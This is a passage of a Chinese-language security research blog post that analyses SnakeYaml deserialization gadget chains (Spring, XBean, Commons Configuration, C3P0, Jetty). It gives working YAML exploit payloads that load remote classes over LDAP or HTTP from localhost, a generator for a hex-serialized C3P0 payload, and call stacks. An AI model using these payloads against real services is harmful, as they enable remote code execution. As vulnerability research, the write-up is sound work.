class="code"><pre><span class="line">lookup:417, InitialContext (javax.naming)</span><br><span class="line">connect:624, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">setAutoCommit:4067, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">set:77, MethodProperty (org.yaml.snakeyaml.introspector)</span><br><span class="line">constructJavaBean2ndStep:263, Constructor$ConstructMapping (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:149, Constructor$ConstructMapping (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:309, Constructor$ConstructYamlObject (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObjectNoCheck:216, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObject:205, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructDocument:164, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">getSingleData:148, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">loadFromReader:525, Yaml (org.yaml.snakeyaml)</span><br><span class="line">load:438, Yaml (org.yaml.snakeyaml)</span><br><span class="line">main:7, Test</span><br></pre></td></tr></table></figure><h3 id="Spring-PropertyPathFactoryBean"><a href="#Spring-PropertyPathFactoryBean" class="headerlink" title="Spring PropertyPathFactoryBean"></a>Spring PropertyPathFactoryBean</h3><p>需要在目标环境存在springframework相关的jar包，以我本地环境为例：snakeyaml-1.25，commons-logging-1.2，unboundid-ldapsdk-4.0.9，spring-beans-5.0.2.RELEASE，spring-context-5.0.2.RELEASE，spring-core-5.0.2.RELEASE。</p><p>可以直接将String类型的PoC传参给Yaml.load()，也可以从文件中读取内容传入文件流给Yaml.load()，需要注意PoC中的各行的间隔距离：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String poc = <span class="string">"!!org.springframework.beans.factory.config.PropertyPathFactoryBean\n"</span> +</span><br><span class="line">                <span class="string">" targetBeanName: \"ldap://localhost:1389/Exploit\"\n"</span> +</span><br><span class="line">                <span class="string">" propertyPath: mi1k7ea\n"</span> +</span><br><span class="line">                <span class="string">" beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory\n"</span> +</span><br><span class="line">                <span class="string">"  shareableResources: [\"ldap://localhost:1389/Exploit\"]"</span>;</span><br><span class="line">        Yaml yaml = <span class="keyword">new</span> Yaml();</span><br><span class="line">        yaml.load(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InputStream poc = <span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(<span class="string">"1.txt"</span>));</span><br><span class="line">            Yaml yaml = <span class="keyword">new</span> Yaml();</span><br><span class="line">            yaml.load(poc);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1.txt，即关键部分PoC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">!!org.springframework.beans.factory.config.PropertyPathFactoryBean</span><br><span class="line">    targetBeanName: &quot;ldap://localhost:1389/Exploit&quot;</span><br><span class="line">    propertyPath: mi1k7ea</span><br><span class="line">    beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory</span><br><span class="line">        shareableResources: [&quot;ldap://localhost:1389/Exploit&quot;]</span><br></pre></td></tr></table></figure><p>另起LDAP服务和放置Exploit类的Web服务，运行即可触发：</p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/18.png" alt=""></p><p>简单地说，PropertyPathFactoryBean类的beanFactory属性可以设置一个远程的Factory，类似于JNDI注入的原理，当SnakeYaml反序列化的时候会调用到该属性的setter方法，通过JNDI注入漏洞成功实现反序列化漏洞的利用。</p><p>函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">lookup:92, JndiLocatorSupport (org.springframework.jndi)</span><br><span class="line">doGetSingleton:220, SimpleJndiBeanFactory (org.springframework.jndi.support)</span><br><span class="line">getBean:113, SimpleJndiBeanFactory (org.springframework.jndi.support)</span><br><span class="line">getBean:106, SimpleJndiBeanFactory (org.springframework.jndi.support)</span><br><span class="line">setBeanFactory:196, PropertyPathFactoryBean (org.springframework.beans.factory.config)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">set:77, MethodProperty (org.yaml.snakeyaml.introspector)</span><br><span class="line">constructJavaBean2ndStep:263, Constructor$ConstructMapping (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:149, Constructor$ConstructMapping (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:309, Constructor$ConstructYamlObject (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObjectNoCheck:216, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObject:205, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructDocument:164, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">getSingleData:148, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">loadFromReader:525, Yaml (org.yaml.snakeyaml)</span><br><span class="line">load:453, Yaml (org.yaml.snakeyaml)</span><br><span class="line">main:19, Test</span><br></pre></td></tr></table></figure><h3 id="Spring-DefaultBeanFactoryPointcutAdvisor"><a href="#Spring-DefaultBeanFactoryPointcutAdvisor" class="headerlink" title="Spring DefaultBeanFactoryPointcutAdvisor"></a>Spring DefaultBeanFactoryPointcutAdvisor</h3><p>需要在目标环境存在springframework相关的jar包，以我本地环境为例：snakeyaml-1.25，commons-logging-1.2，unboundid-ldapsdk-4.0.9，spring-beans-5.0.2.RELEASE，spring-context-5.0.2.RELEASE，spring-core-5.0.2.RELEASE，spring-aop-4.3.7.RELEASE。</p><p>关键PoC如下，2.txt：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">set:</span><br><span class="line">    ? !!org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor</span><br><span class="line">      adviceBeanName: &quot;ldap://localhost:1389/Exploit&quot;</span><br><span class="line">      beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory</span><br><span class="line">        shareableResources: [&quot;ldap://localhost:1389/Exploit&quot;]</span><br><span class="line">    ? !!org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor []</span><br></pre></td></tr></table></figure><p>和前面一样的利用方式：</p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/19.png" alt=""></p><p>DefaultBeanFactoryPointcutAdvisor类的利用原理同上，也是JNDI注入漏洞导致的反序列化漏洞。</p><p>函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">lookup:92, JndiLocatorSupport (org.springframework.jndi)</span><br><span class="line">doGetSingleton:220, SimpleJndiBeanFactory (org.springframework.jndi.support)</span><br><span class="line">getBean:113, SimpleJndiBeanFactory (org.springframework.jndi.support)</span><br><span class="line">getAdvice:109, AbstractBeanFactoryPointcutAdvisor (org.springframework.aop.support)</span><br><span class="line">equals:74, AbstractPointcutAdvisor (org.springframework.aop.support)</span><br><span class="line">putVal:634, HashMap (java.util)</span><br><span class="line">put:611, HashMap (java.util)</span><br><span class="line">processDuplicateKeys:96, SafeConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">flattenMapping:70, SafeConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructMapping2ndStep:183, SafeConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructMapping:446, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:521, SafeConstructor$ConstructYamlMap (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObjectNoCheck:216, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObject:205, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructMapping2ndStep:465, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructMapping2ndStep:184, SafeConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructMapping:446, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:521, SafeConstructor$ConstructYamlMap (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObjectNoCheck:216, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObject:205, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructDocument:164, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">getSingleData:148, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">loadFromReader:525, Yaml (org.yaml.snakeyaml)</span><br><span class="line">load:453, Yaml (org.yaml.snakeyaml)</span><br><span class="line">main:12, Test</span><br></pre></td></tr></table></figure><h3 id="Apache-XBean"><a href="#Apache-XBean" class="headerlink" title="Apache XBean"></a>Apache XBean</h3><p>本地环境用的xbean-naming-4.5.jar。</p><p>关键PoC，3.txt：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!!javax.management.BadAttributeValueExpException[!!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding [&quot;foo&quot;,!!javax.naming.Reference [foo, &quot;Exploit&quot;, &quot;http://localhost:8000/&quot;],!!org.apache.xbean.naming.context.WritableContext []]]</span><br></pre></td></tr></table></figure><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/20.png" alt=""></p><p>具体原理还没分析搞懂，之前简单调试下发现在调用ContextUtil$ReadOnlyBinding.ReadOnlyBinding()函数进行context属性的初始化为WritableContext类实例时会触发漏洞（后面有时间搞懂了再补充）：</p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/21.png" alt=""></p><p>函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;init&gt;:183, ContextUtil$ReadOnlyBinding (org.apache.xbean.naming.context)</span><br><span class="line">&lt;init&gt;:176, ContextUtil$ReadOnlyBinding (org.apache.xbean.naming.context)</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:62, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:422, Constructor (java.lang.reflect)</span><br><span class="line">construct:548, Constructor$ConstructSequence (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:309, Constructor$ConstructYamlObject (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObjectNoCheck:216, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObject:205, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:543, Constructor$ConstructSequence (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:309, Constructor$ConstructYamlObject (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObjectNoCheck:216, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObject:205, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructDocument:164, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">getSingleData:148, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">loadFromReader:525, Yaml (org.yaml.snakeyaml)</span><br><span class="line">load:453, Yaml (org.yaml.snakeyaml)</span><br><span class="line">main:12, Test</span><br></pre></td></tr></table></figure><h3 id="Apache-Commons-Configuration"><a href="#Apache-Commons-Configuration" class="headerlink" title="Apache Commons Configuration"></a>Apache Commons Configuration</h3><p>本地环境用的：snakeyaml-1.25，commons-logging-1.2，unboundid-ldapsdk-4.0.9，commons-lang-2.6，commons-configuration-1.10。</p><p>关键PoC，4.txt：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set:</span><br><span class="line">    ? !!org.apache.commons.configuration.ConfigurationMap [!!org.apache.commons.configuration.JNDIConfiguration [!!javax.naming.InitialContext [], &quot;ldap://localhost:1389/Exploit&quot;]]</span><br></pre></td></tr></table></figure><p>弹四次计算器：</p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/22.png" alt=""></p><p>简单跟了下程序，在调用完ConfigurationMap.ConfigurationMap()这个构造函数对configuration属性进行赋值后就触发了，具体原理有待分析：</p><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/23.png" alt=""></p><p>此时的函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;init&gt;:55, ConfigurationMap (org.apache.commons.configuration)</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:62, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:422, Constructor (java.lang.reflect)</span><br><span class="line">construct:548, Constructor$ConstructSequence (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:309, Constructor$ConstructYamlObject (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObjectNoCheck:216, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObject:205, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">processDuplicateKeys:85, SafeConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">flattenMapping:70, SafeConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructMapping2ndStep:183, SafeConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructMapping:446, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:521, SafeConstructor$ConstructYamlMap (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObjectNoCheck:216, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObject:205, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructMapping2ndStep:465, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructMapping2ndStep:184, SafeConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructMapping:446, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:521, SafeConstructor$ConstructYamlMap (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObjectNoCheck:216, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObject:205, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructDocument:164, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">getSingleData:148, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">loadFromReader:525, Yaml (org.yaml.snakeyaml)</span><br><span class="line">load:453, Yaml (org.yaml.snakeyaml)</span><br><span class="line">main:12, Test</span><br></pre></td></tr></table></figure><h3 id="C3P0-JndiRefForwardingDataSource"><a href="#C3P0-JndiRefForwardingDataSource" class="headerlink" title="C3P0 JndiRefForwardingDataSource"></a>C3P0 JndiRefForwardingDataSource</h3><p>原理和环境相关的参考<a href="https://www.mi1k7ea.com/2019/11/24/Jackson%E7%B3%BB%E5%88%97%E4%B8%83%E2%80%94%E2%80%94%E5%85%B6%E4%BB%96Gadgets/#0x03-%E5%9F%BA%E4%BA%8EC3P0-JndiRefForwardingDataSource%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE">Jackson系列文章</a>即可。</p><p>关键PoC，5.txt：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">!!com.mchange.v2.c3p0.JndiRefForwardingDataSource</span><br><span class="line">  jndiName: &quot;ldap://localhost:1389/Exploit&quot;</span><br><span class="line">  loginTimeout: 0</span><br></pre></td></tr></table></figure><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/24.png" alt=""></p><h3 id="C3P0-WrapperConnectionPoolDataSource"><a href="#C3P0-WrapperConnectionPoolDataSource" class="headerlink" title="C3P0 WrapperConnectionPoolDataSource"></a>C3P0 WrapperConnectionPoolDataSource</h3><p>本地环境的jar包：c3p0-0.9.5.2，mchange-commons-java-0.2.15，commons-codec-1.12，snakeyaml-1.25。</p><p>关键PoC，注意冒号后面有个空格：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource</span><br><span class="line">  userOverridesAsString: &quot;HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400074578706c6f6974740016687474703a2f2f6c6f63616c686f73743a383030302f740003466f6f;&quot;</span><br></pre></td></tr></table></figure><p>我们主要看下userOverridesAsString的值是如何构造的，参考marshalsec的Gadget就知道了，下面是输出该值的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">createPoC</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String poc = makeC3P0UserOverridesString(<span class="string">"http://localhost:8000/"</span>, <span class="string">"Exploit"</span>);</span><br><span class="line">        System.out.println(poc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">makeC3P0UserOverridesString</span> <span class="params">( String codebase, String clazz )</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException,</span></span><br><span class="line"><span class="function">InstantiationException, IllegalAccessException, InvocationTargetException, IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">    ByteArrayOutputStream b = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">    <span class="keyword">try</span> ( ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(b) ) &#123;</span><br><span class="line">        Class&lt;?&gt; refclz = Class.forName(<span class="string">"com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized"</span>); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">        Constructor&lt;?&gt; con = refclz.getDeclaredConstructor(Reference.class, Name.class, Name.class, Hashtable.class);</span><br><span class="line">        con.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Reference jndiref = <span class="keyword">new</span> Reference(<span class="string">"Foo"</span>, clazz, codebase);</span><br><span class="line">        Object ref = con.newInstance(jndiref, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">        oos.writeObject(ref);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"HexAsciiSerializedMap:"</span> + Hex.encodeHexString(b.toByteArray()) + <span class="string">";"</span>; <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/25.png" alt=""></p><p>该Gadget原理是userOverridesAsString的setter方法触发C3P0数据库连接池去调用referenceToObject()函数将Reference转化成对象的时候导致的。</p><p>函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;init&gt;:2, Exploit</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:62, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:422, Constructor (java.lang.reflect)</span><br><span class="line">newInstance:442, Class (java.lang)</span><br><span class="line">referenceToObject:92, ReferenceableUtils (com.mchange.v2.naming)</span><br><span class="line">getObject:118, ReferenceIndirector$ReferenceSerialized (com.mchange.v2.naming)</span><br><span class="line">fromByteArray:125, SerializableUtils (com.mchange.v2.ser)</span><br><span class="line">parseUserOverridesAsString:318, C3P0ImplUtils (com.mchange.v2.c3p0.impl)</span><br><span class="line">vetoableChange:110, WrapperConnectionPoolDataSource$1 (com.mchange.v2.c3p0)</span><br><span class="line">fireVetoableChange:375, VetoableChangeSupport (java.beans)</span><br><span class="line">fireVetoableChange:271, VetoableChangeSupport (java.beans)</span><br><span class="line">setUserOverridesAsString:387, WrapperConnectionPoolDataSourceBase (com.mchange.v2.c3p0.impl)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">set:77, MethodProperty (org.yaml.snakeyaml.introspector)</span><br><span class="line">constructJavaBean2ndStep:263, Constructor$ConstructMapping (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:149, Constructor$ConstructMapping (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:309, Constructor$ConstructYamlObject (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObjectNoCheck:216, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObject:205, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructDocument:164, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">getSingleData:148, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">loadFromReader:525, Yaml (org.yaml.snakeyaml)</span><br><span class="line">load:453, Yaml (org.yaml.snakeyaml)</span><br><span class="line">main:17, Test</span><br></pre></td></tr></table></figure><h3 id="Resource"><a href="#Resource" class="headerlink" title="Resource"></a>Resource</h3><p>本地环境的jar包：snakeyaml-1.25，jetty-jndi-9.4.8.v20171121，jetty-plus-9.4.8.v20171121，jetty-util-9.4.8.v20171121。</p><p>关键PoC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[!!org.eclipse.jetty.plus.jndi.Resource [&quot;__/obj&quot;, !!javax.naming.Reference [&quot;foo&quot;, &quot;Exploit&quot;, &quot;http://localhost:8000/&quot;]], !!org.eclipse.jetty.plus.jndi.Resource [&quot;obj/test&quot;, !!java.lang.Object []]]</span><br></pre></td></tr></table></figure><p><img src="/2019/11/29/Java-SnakeYaml反序列化漏洞/26.png" alt=""></p><p>Resource类的原理是JNDI注入漏洞，但是是基于NamingManager.getObjectInstance()函数的注入。</p><p>函数调用栈入如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;init&gt;:2, Exploit</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:62, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:422, Constructor (java.lang.reflect)</span><br><span class="line">newInstance:442, Class (java.lang)</span><br><span 